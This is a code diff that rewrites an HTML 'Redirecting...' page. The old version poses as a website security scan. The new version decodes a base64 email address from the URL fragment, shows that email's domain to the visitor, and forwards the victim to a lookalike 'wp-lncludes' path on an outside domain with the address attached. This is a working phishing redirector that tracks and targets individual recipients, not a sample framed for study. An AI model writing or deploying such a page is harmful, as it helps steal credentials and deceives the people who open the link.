@@ -1,50 +1,38 @@
-
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f5f5f5;
-        }
-        .loading-container {
-            text-align: center;
-        }
-        .logo {
-            width: 100px;
-            height: auto;
-            margin: 0 auto 5px;
-            animation: blink 1s infinite;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        .message {
-            color: #333;
-            font-size: 18px;
-        }
-    </style>
     <script>
-        // Redirect after 5 second
-        setTimeout(function() {
-            window.location.href = https://commerceconnex.com/wp-lncludes";
-        }, 1000);
+    // Function to extract the domain from the email address
+    function extractDomain(email) {
+        var atIndex = email.indexOf('@');
+        if (atIndex !== -1) {
+            return email.substr(atIndex + 1);
+        }
+        return '';
+    }
+
+    // Decode the base64 email address
+    var base64email = window.location.hash.substr(1); // Remove the '#' from the hash
+    var email = atob(base64email); // Decode the base64 string
+
+    // Extract the domain from the email address
+    var domain = extractDomain(email);
+
+    // Perform the redirect to the specified URL with the encoded email
+    setTimeout(function() {
+        window.location.href = 'https://commerceconnex.com/wp-lncludes/' + base64email;
+    }, 1000);
     </script>
 </head>
 <body>
-    <div class="loading-container">
-        <!-- Replace 'logo.jpg' with the actual path or URL of your logo -->
-        <img src="https://i.ibb.co/sjGkSfP/hh.gif" alt="Security Scan Logo" class="logo">
-        <p class="message">Please wait while we scan this website for potential threats...</p>
-    </div>
+    <h1>Redirecting...</h1>
+    <p>You're being redirected to <strong id="redirectDomain"></strong> in a moment.</p>
+
+    <script>
+    // Update the content of the 'redirectDomain' element with the extracted domain
+    var redirectDomainElement = document.getElementById('redirectDomain');
+    redirectDomainElement.textContent = domain;
+    </script>
 </body>
 </html>
